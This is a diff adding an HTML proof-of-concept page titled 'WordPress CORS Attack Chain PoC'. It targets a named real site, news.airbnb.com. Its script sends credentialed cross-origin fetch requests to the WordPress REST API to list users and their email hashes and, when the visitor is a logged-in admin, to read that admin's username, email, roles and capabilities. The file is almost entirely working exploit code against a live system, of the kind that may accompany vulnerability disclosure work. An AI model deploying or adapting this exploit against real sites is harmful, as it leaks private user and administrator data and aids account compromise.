@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head><title>WordPress CORS Attack Chain PoC</title></head>
+<body>
+<h2>WordPress CORS Attack Chain PoC</h2>
+<p>If an authenticated WordPress admin visits this page, their session cookies will be sent
+cross-origin to the WordPress REST API (due to reflected-origin CORS + ACAC:true).</p>
+<pre id="out">Loading...</pre>
+<script>
+(async () => {
+  const out = document.getElementById('out');
+  const log = m => { out.textContent += m + '\n'; };
+  const BASE = 'https://news.airbnb.com/wp-json';
+
+  log('[*] Step 1: Enumerate users (no auth needed, but CORS reflects attacker origin)');
+  try {
+    const r = await fetch(BASE + '/wp/v2/users', {credentials: 'include'});
+    const users = await r.json();
+    log('[+] Users exfiltrated: ' + users.length);
+    users.forEach(u => {
+      const h = (u.avatar_urls||{})['96']||'';
+      const m = h.match(/avatar\/([a-f0-9]+)/);
+      log('  id=' + u.id + ' name=' + u.name + ' slug=' + u.slug + (m ? ' email_md5=' + m[1] : ''));
+    });
+  } catch(e) { log('[!] Users fetch failed: ' + e); }
+
+  log('\n[*] Step 2: Check if visitor is an authenticated admin (/users/me)');
+  try {
+    const r2 = await fetch(BASE + '/wp/v2/users/me', {credentials: 'include'});
+    if (r2.ok) {
+      const me = await r2.json();
+      log('[CRITICAL] Authenticated admin detected! Exfiltrated profile:');
+      log('  username=' + me.username);
+      log('  email=' + me.email);
+      log('  roles=' + JSON.stringify(me.roles));
+      log('  capabilities=' + JSON.stringify(Object.keys(me.capabilities || {})));
+    } else {
+      log('[INFO] Not authenticated (status=' + r2.status + '). User list still exfiltrated above.');
+    }
+  } catch(e) { log('[!] /users/me fetch failed: ' + e); }
+})();
+</script>
+</body>
+</html>
